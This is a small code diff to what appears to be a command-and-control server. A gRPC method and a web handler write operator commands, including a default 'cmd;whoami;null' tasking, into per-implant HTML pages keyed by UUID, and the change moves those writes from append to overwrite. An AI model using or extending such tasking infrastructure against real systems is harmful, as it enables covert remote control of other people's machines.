@@ -27,7 +27,7 @@ class UnaryService(pb2_grpc.UnaryServicer):
         else:
             if opt == 'SC':
                 # If option is to set command, then write it to the file
-                with open ("{ID}.html", "a") as f:
+                with open ("{ID}.html", "w") as f:
                     f.write(message)
                     result = f'Received command, wrote {message} to file {ID}'
                     result = {'message': result, 'received': True}
@@ -51,7 +51,7 @@ def home():
         message = "cmd;whoami;null "
         print(f'headers:{val}')
         # create a new page for the UUID we got from the headers
-        with open (f"{val}.html", "a") as f:
+        with open (f"{val}.html", "w") as f:
             f.write(message)
         return ('')
 
